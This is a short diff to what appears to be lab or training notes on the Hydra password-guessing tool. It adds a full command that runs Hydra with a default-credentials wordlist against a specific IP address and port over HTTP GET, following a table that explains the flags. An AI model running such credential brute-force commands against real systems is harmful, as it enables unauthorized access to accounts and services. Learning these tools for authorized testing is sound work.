@@ -9,3 +9,9 @@
 | `-s PORT`                          | Target Port                   |
 | `http-get`                         | Request Method                |
 | `/`                                | Target Path                   |
+
+{% code overflow="wrap" %}
+```
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt 83.136.253.102 -s 51865 http-get /
+```
+{% endcode %}
